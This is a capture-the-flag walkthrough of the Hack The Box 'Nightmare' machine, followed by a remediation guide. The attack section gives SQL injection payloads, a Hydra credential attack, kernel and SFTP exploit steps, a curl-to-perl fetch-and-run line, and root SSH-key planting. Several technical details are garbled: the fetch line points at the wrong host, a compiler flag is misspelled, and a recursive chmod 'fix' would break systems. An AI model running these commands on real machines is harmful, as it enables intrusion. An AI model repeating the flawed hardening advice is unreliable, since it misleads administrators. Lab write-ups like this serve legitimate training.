---
title: "Nightmare HTB - Insane Linux Box Walkthrough"
date: 2025-09-22T09:45:00Z
tags: ["insane-linux", "web", "sql-injection", "sftp", "kernel-exploit", "in-memory-elf", "crash-dump", "privilege-escalation", "32-bit", "ubuntu-xenial"]
difficulty: ["insane"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Nightmare HTB machine featuring second-order SQL injection, SFTP exploit development, in-memory ELF execution, crash dump exploitation, and kernel-based privilege escalation techniques"
---

# Nightmare HTB - Insane Linux Box Walkthrough

{{< youtube TVhtjiSedjU >}}

## Key Exploitation Steps and Techniques

Below is a chronological extraction of the key exploitation steps and techniques from the provided data, focusing on the primary and unintended methods used to exploit the "Nightmare" machine, as described in the transcript.

### Primary Exploitation Path
1. **Initial Reconnaissance (Nmap Scan)**:
   - Technique: Network scanning with Nmap.
   - Step: Run Nmap to identify open ports: Apache on port 80 and SSH on port 2222, with patches on Ubuntu Xenial (32-bit system indicated by SSH flags).

2. **Web Application Testing (Apache on Port 80)**:
   - Technique: Web application vulnerability testing.
   - Step: Attempt to register a user on the web application, testing for cross-site scripting (XSS) by inputting random characters in username and password fields. Observe a SQL error, indicating potential SQL injection.

3. **SQL Injection (Second-Order SQL Injection)**:
   - Technique: SQL injection via user registration.
   - Step: Register a user with a crafted username (e.g., `a' union select 1,2 --`) to test for SQL injection. Confirm SQL injection vulnerability in the username field due to a `SELECT * WHERE username =` query structure.

4. **Database Enumeration (Union-Based SQL Injection)**:
   - Technique: Union-based SQL injection to enumerate database schema.
   - Step: Use `UNION SELECT table_schema,table_name,column_name FROM information_schema.columns --` to dump database tables. Identify the `users` table with `username` and `password` columns.

5. **Extract Credentials**:
   - Technique: Credential extraction via SQL injection.
   - Step: Dump credentials (e.g., username: `admin`, password: [hashed or plaintext]) and save them to a text file using a delimiter (e.g., colon).

6. **Credential-Based Attack (Hydra on SSH/SFTP)**:
   - Technique: Brute-forcing credentials with Hydra.
   - Step: Use Hydra with the extracted credentials (`hydra -C user_pass.txt ssh://[TARGET-IP] -p 2222`) to attempt SSH login. Identify that the service is SFTP, not SSH, and attempt SFTP login with credentials (e.g., `sftp -P 2222 ftpuser@[TARGET-IP]`).

7. **SFTP Exploit (Privilege Escalation)**:
   - Technique: Exploit development and execution.
   - Step: Identify an SFTP exploit from a full disclosure post. Modify the 64-bit exploit code to work on a 32-bit system by changing `long long` to `int`, `size_t` to `unsigned int`, and adjusting memory addresses. Compile the exploit with appropriate flags and execute it (`./sh_exploit [TARGET-IP] ftpuser`).

8. **Privilege Escalation (Kernel Exploit)**:
   - Technique: Kernel exploit to gain root access.
   - Step: Identify the kernel version (`uname -a`) and search for a matching exploit for Ubuntu Xenial. Compile the kernel exploit (`gcc -o exploit kernel.c`) on a separate system, transfer it to the target via `curl` or Python HTTP server, and execute it to gain root access.

9. **Persistence (Modify LSB Release)**:
   - Technique: System manipulation for exploit compatibility.
   - Step: Modify `/etc/lsb-release` to mimic a vulnerable Ubuntu Xenial version (e.g., change distro name to "Bladerunner") to ensure the kernel exploit works. Recompile and execute the exploit to achieve root.

### Unintended Exploitation Paths
#### 1. In-Memory ELF Execution (Inspired by muBIX)
   - **Technique**: Execute ELF binaries in memory without disk writes, bypassing restrictions like `/tmp` or `/dev/shm`.
   - **Steps**:
     1. **Research and Setup**: Find a blog post on in-memory ELF execution and extract a Perl command to prepare the binary (`elf-prep.sh`).
     2. **Prepare Binary**: Run `bash elf-prep.sh pone` to convert the binary (`pone`) into hex format for in-memory loading.
     3. **Create Loader Script**: Combine `elf_load.pl.head`, `elf_load.pl.body` (hex output), and `elf_load.pl.tail` into `elf_load.pl` to execute the binary in memory.
     4. **Transfer and Execute**: Start a Python HTTP server on the attacker's machine, use `curl [TARGET-IP]/elf_load.pl | perl` on the target to execute the binary, gaining a shell.
     5. **Stabilize Shell**: Modify the exploit to write an SSH key to `/root/.ssh/authorized_keys` for persistent root access (`ssh -i key root@[TARGET-IP] -p 2222`).
     6. **Troubleshooting**: Address sandbox issues (e.g., network restrictions on `ens33` or loopback) by adjusting the exploit code to avoid network dependencies.

#### 2. Crash Dump Exploitation (Hack The Box Forum)
   - **Technique**: Exploit a process crash dump that creates a file with 777 permissions, allowing arbitrary binary execution.
   - **Steps**:
     1. **Identify Vulnerable Process**: Find the SFTP process (`pgrep -u ftpuser -l`) running as the `ftpuser`.
     2. **Trigger Crash Dump**: Send a `SIGSEGV` signal (`kill -11 1681`) to the SFTP process to create a crash dump file (`/lock`) with 777 permissions.
     3. **Overwrite Crash Dump**: Write a malicious ELF binary (e.g., `pone`) to the crash dump file (`curl [TARGET-IP]/pone -o /lock`).
     4. **Execute Binary**: Run the modified crash dump file (`./lock`) to gain a shell.
     5. **Gain Root Access**: Use the shell to achieve root privileges or write an SSH key for persistent access.

### Summary
- **Primary Path**: Uses Nmap, SQL injection, credential extraction, SFTP exploit, and kernel exploit to gain root access, with additional manipulation of `/etc/lsb-release` for compatibility.
- **Unintended Path 1 (In-Memory ELF)**: Leverages in-memory ELF execution to bypass disk write restrictions, achieving root via a Perl script and SSH key persistence.
- **Unintended Path 2 (Crash Dump)**: Exploits a crash dump file's permissive permissions to execute a malicious binary, gaining root access.

These steps outline the exploitation process in chronological order, covering both the intended and unintended methods described in the transcript.

## Security Gaps and Remediation

Based on the provided transcript detailing the exploitation of the "Nightmare" machine, several vulnerabilities were exploited across different services and systems. Below, I identify the gaps in each service or system and provide recommendations for fixing them with either proper source code fixes or configuration changes. The vulnerabilities are categorized by the affected service or system (Web Application, SFTP, and Kernel/System), and the fixes focus on addressing the root causes to prevent exploitation.

### 1. Web Application (Apache on Port 80)
#### Gaps and Vulnerabilities
- **SQL Injection (Second-Order SQL Injection)**:
  - **Gap**: The web application allows user input (username field during registration) to be directly included in SQL queries without proper sanitization, enabling SQL injection. The transcript mentions a SQL error when registering with malformed input and successful `UNION SELECT` queries to extract database information.
  - **Impact**: Attackers can enumerate database schema, extract sensitive data (e.g., usernames and passwords), and potentially escalate privileges.

- **Cross-Site Scripting (XSS) Testing**:
  - **Gap**: The application accepts arbitrary input in username and password fields without validation, suggesting potential XSS vulnerabilities (though not fully exploited in the transcript).
  - **Impact**: If XSS is exploitable, attackers could inject malicious scripts to steal user sessions or perform unauthorized actions.

#### Fixes
- **SQL Injection**:
  - **Source Code Fix**:
    - Use **prepared statements** or **parameterized queries** in the application code to prevent SQL injection. For example, in PHP, use PDO or MySQLi with parameterized queries:
      ```php
      $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
      $stmt->execute([$username]);
      ```
    - Implement input validation to ensure usernames and passwords conform to expected formats (e.g., alphanumeric characters only).
    - Sanitize and escape all user inputs before processing them in SQL queries.
  - **Configuration Fix**:
    - Enable strict SQL mode on the database server to reject invalid queries.
    - Configure the web application to limit database permissions, ensuring the application user has only the minimum required privileges (e.g., no access to `information_schema`).
    - Use a Web Application Firewall (WAF) to detect and block SQL injection patterns.

- **Cross-Site Scripting (XSS)**:
  - **Source Code Fix**:
    - Implement input validation to reject or sanitize special characters (e.g., `<`, `>`, `"`, `'`) in username and password fields.
    - Use output encoding when displaying user input (e.g., `htmlspecialchars()` in PHP) to prevent script execution.
    - Set Content Security Policy (CSP) headers to restrict script sources:
      ```http
      Content-Security-Policy: script-src 'self';
      ```
  - **Configuration Fix**:
    - Configure the web server to set HTTP headers like `X-XSS-Protection: 1; mode=block` to enable browser XSS filtering.
    - Ensure cookies are marked with `HttpOnly` and `Secure` flags to prevent access via JavaScript:
      ```php
      session_set_cookie_params(['httponly' => true, 'secure' => true]);
      ```

### 2. SFTP Service (Port 2222)
#### Gaps and Vulnerabilities
- **Vulnerable SFTP Implementation**:
  - **Gap**: The SFTP service (likely OpenSSH or a similar implementation) is running a version vulnerable to a specific exploit, allowing remote code execution or privilege escalation. The transcript mentions a full disclosure post and modifications to exploit code for 32-bit compatibility.
  - **Impact**: Attackers can execute arbitrary code or gain unauthorized access to the system as the `ftpuser`.

- **Crash Dump with Permissive Permissions**:
  - **Gap**: When the SFTP process crashes, it generates a crash dump file (`/lock`) with 777 permissions, allowing any user to overwrite it with a malicious binary.
  - **Impact**: Attackers can replace the crash dump with an executable to gain unauthorized access or escalate privileges.

#### Fixes
- **Vulnerable SFTP Implementation**:
  - **Source Code Fix**:
    - Update the SFTP software (e.g., OpenSSH) to the latest stable version to patch known vulnerabilities. The transcript indicates a "not so recent version," suggesting an outdated installation.
    - If custom SFTP software is used, audit and patch the code to address memory corruption or other vulnerabilities exploited in the transcript (e.g., improper handling of 32-bit vs. 64-bit memory addresses).
  - **Configuration Fix**:
    - Configure the SFTP server to run in a chroot jail to restrict access to the filesystem:
      ```bash
      Subsystem sftp internal-sftp
      Match User ftpuser
          ChrootDirectory /home/ftpuser
          ForceCommand internal-sftp
      ```
    - Harden SSH/SFTP configuration in `/etc/ssh/sshd_config`:
      - Disable root login: `PermitRootLogin no`.
      - Restrict allowed users: `AllowUsers ftpuser`.
      - Use strong ciphers and disable deprecated algorithms: `Ciphers aes256-ctr,aes192-ctr,aes128-ctr`.
    - Apply system-wide security patches regularly using `apt update && apt upgrade` on Ubuntu.

- **Crash Dump with Permissive Permissions**:
  - **Source Code Fix**:
    - Modify the SFTP software or system crash handling to set restrictive permissions (e.g., 600) on crash dump files or disable crash dumps entirely if not needed.
    - If using a custom SFTP implementation, ensure crash dump files are written to a secure directory accessible only by root.
  - **Configuration Fix**:
    - Configure the system to restrict crash dump permissions via `sysctl`:
      ```bash
      echo "fs.suid_dumpable = 0" >> /etc/sysctl.conf
      sysctl -p
      ```
      This disables setuid/setgid binaries from creating core dumps.
    - Set `ulimit -c 0` for the SFTP user to disable core dumps:
      ```bash
      echo "ftpuser hard core 0" >> /etc/security/limits.conf
      ```
    - Ensure crash dump directories (e.g., `/var/crash`) have restrictive permissions:
      ```bash
      chmod 700 /var/crash
      chown root:root /var/crash
      ```

### 3. Kernel/System
#### Gaps and Vulnerabilities
- **Outdated Kernel (Ubuntu Xenial)**:
  - **Gap**: The system runs an outdated Ubuntu Xenial kernel (e.g., 4.8.0-58) vulnerable to a known exploit, allowing privilege escalation to root.
  - **Impact**: Attackers can execute a kernel exploit to gain root access, bypassing user-level restrictions.

- **Writable `/etc/lsb-release`**:
  - **Gap**: The `/etc/lsb-release` file is writable by the `ftpuser`, allowing attackers to modify system identification to trick exploits into targeting specific vulnerabilities.
  - **Impact**: Facilitates kernel exploit execution by mimicking a vulnerable system configuration.

- **Lack of Binary Protections**:
  - **Gap**: The system allows execution of arbitrary binaries (e.g., via crash dumps or in-memory execution) without modern protections like Address Space Layout Randomization (ASLR) or stack-smashing protection.
  - **Impact**: Simplifies exploitation by allowing predictable memory addresses and unchecked binary execution.

#### Fixes
- **Outdated Kernel**:
  - **Source Code Fix**:
    - N/A (kernel source code fixes are typically handled by upstream updates).
  - **Configuration Fix**:
    - Upgrade the kernel to the latest stable version for Ubuntu Xenial or migrate to a supported Ubuntu version (e.g., Focal or Jammy):
      ```bash
      apt update && apt install linux-generic
      ```
    - Enable automatic security updates for the kernel:
      ```bash
      apt install unattended-upgrades
      dpkg-reconfigure --priority=low unattended-upgrades
      ```
    - Reboot the system after kernel updates to ensure the new kernel is loaded.

- **Writable `/etc/lsb-release`**:
  - **Source Code Fix**:
    - N/A (this is a configuration issue, not a code issue).
  - **Configuration Fix**:
    - Restrict permissions on `/etc/lsb-release` to prevent modification by non-root users:
      ```bash
      chmod 644 /etc/lsb-release
      chown root:root /etc/lsb-release
      ```
    - Use AppArmor or SELinux to enforce stricter access controls on system files:
      ```bash
      apparmor_parser -r /etc/apparmor.d/usr.sbin.sshd
      ```
    - Monitor file changes with tools like `auditd` to detect unauthorized modifications:
      ```bash
      auditctl -w /etc/lsb-release -p wa -k lsb-release
      ```

- **Lack of Binary Protections**:
  - **Source Code Fix**:
    - Recompile critical binaries with stack-smashing protection (`-fstack-protect`) and position-independent code (`-fPIE`):
      ```bash
      gcc -fstack-protect -fPIE -o binary source.c
      ```
  - **Configuration Fix**:
    - Enable ASLR system-wide:
      ```bash
      echo "kernel.randomize_va_space = 2" >> /etc/sysctl.conf
      sysctl -p
      ```
    - Use a Mandatory Access Control (MAC) system like AppArmor or SELinux to restrict binary execution:
      ```bash
      apparmor_parser -r /etc/apparmor.d/usr.bin.sftp
      ```
    - Restrict executable permissions on user-writable directories:
      ```bash
      find / -type d -perm -o+w -exec chmod o-x {} \;
      ```
    - Disable execution in temporary directories:
      ```bash
      mount -o remount,noexec /tmp
      mount -o remount,noexec /dev/shm
      ```

### Additional General Fixes
- **Network Exposure**:
  - **Gap**: Unnecessary ports (80, 2222) are exposed, increasing the attack surface.
  - **Configuration Fix**:
    - Use a firewall (e.g., `ufw`) to restrict access to only necessary services:
      ```bash
      ufw allow 2222/tcp
      ufw deny 80/tcp
      ufw enable
      ```
    - Implement network segmentation to limit access to the SFTP and web services.

- **Weak Authentication**:
  - **Gap**: The `ftpuser` account has weak or predictable credentials, and the system allows brute-forcing via Hydra.
  - **Configuration Fix**:
    - Enforce strong password policies using `pam_pwquality`:
      ```bash
      apt install libpam-pwquality
      echo "password requisite pam_pwquality.so retry=3 minlen=12" >> /etc/pam.d/common-password
      ```
    - Limit login attempts with `fail2ban`:
      ```bash
      apt install fail2ban
      echo "[sshd]
      enabled = true
      maxretry = 3
      bantime = 3600" >> /etc/fail2ban/jail.local
      systemctl restart fail2ban
      ```

### Summary
The "Nightmare" machine has significant vulnerabilities in its web application (SQL injection, potential XSS), SFTP service (exploitable implementation, permissive crash dumps), and kernel/system (outdated kernel, writable system files, lack of binary protections). By implementing the recommended source code and configuration fixes—such as prepared statements, updated software, restricted permissions, and modern security mechanisms—these gaps can be mitigated to prevent exploitation.

## Conclusion

Nightmare is an excellent machine that demonstrates the complexity of 32-bit system exploitation and advanced binary execution techniques. It requires expertise in:
- Second-order SQL injection exploitation and database enumeration
- SFTP service vulnerability analysis and exploit adaptation for 32-bit systems
- In-memory ELF execution techniques for stealth and persistence
- Crash dump exploitation and file permission abuse
- Kernel exploit development and system manipulation
- Advanced privilege escalation through multiple attack vectors

The machine emphasizes the importance of proper input validation, regular software updates, secure file permissions, and modern binary protections in system hardening.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*